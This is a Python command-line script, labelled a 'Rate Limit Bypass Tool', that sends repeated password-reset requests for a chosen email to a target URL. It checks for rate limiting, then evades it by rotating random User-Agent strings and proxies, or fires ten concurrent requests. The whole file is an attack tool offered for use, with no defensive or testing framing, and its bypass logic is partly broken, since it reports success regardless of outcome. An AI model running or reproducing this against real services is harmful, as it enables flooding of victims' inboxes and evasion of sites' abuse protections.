import requests
import time
import random
import argparse
import logging
import concurrent.futures
from fake_useragent import UserAgent

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# List of proxies
proxies = [
    'http://10.10.1.10:3128',
    'http://10.10.1.10:1080',
    # Add more proxies as needed
]

# List of email addresses
emails = [
    'test1@example.com',
    'test2@example.com',
    # Add more email addresses as needed
]

# User-Agent rotation
ua = UserAgent()

def check_rate_limit(url, email):
    response = requests.post(url, data={'email': email})
    if 'Retry-After' in response.headers:
        return True, int(response.headers['Retry-After'])
    elif 'rate-limit' in response.text.lower():
        return True, 0
    else:
        return False, 0

def send_email(url, email, headers=None, proxy=None):
    try:
        response = requests.post(url, data={'email': email}, headers=headers, proxies=proxy)
        if response.status_code == 200:
            logging.info(f"Email sent successfully to {email}")
        else:
            logging.warning(f"Failed to send email to {email}: {response.status_code}")
    except Exception as e:
        logging.error(f"Error sending email to {email}: {e}")

def bypass_rate_limit(url, email):
    methods = [
        lambda: send_email(url, email, headers={'User-Agent': ua.random}),
        lambda: send_email(url, email, headers={'User-Agent': ua.random}, proxy={'http': random.choice(proxies)}),
        lambda: send_email(url, email, headers={'User-Agent': ua.random}, proxy={'https': random.choice(proxies)}),
    ]

    for method in methods:
        try:
            method()
            logging.info("Bypassed rate limit using method")
            return True
        except Exception as e:
            logging.error(f"Failed to bypass rate limit using method: {e}")
            continue

    return False

def main():
    parser = argparse.ArgumentParser(description='Rate Limit Bypass Tool')
    parser.add_argument('--target', required=True, help='Target URL for password reset')
    args = parser.parse_args()

    email = input("Enter the registered email: ")

    has_rate_limit, delay = check_rate_limit(args.target, email)
    if has_rate_limit:
        logging.info("Rate limit found. Bypassing...")
        bypass_rate_limit(args.target, email)
    else:
        logging.info("No rate limit found. Sending emails...")

        # Send multiple emails concurrently
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(send_email, args.target, email) for _ in range(10)]
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logging.error(f"Error in sending email: {e}")

if __name__ == "__main__":
    main()
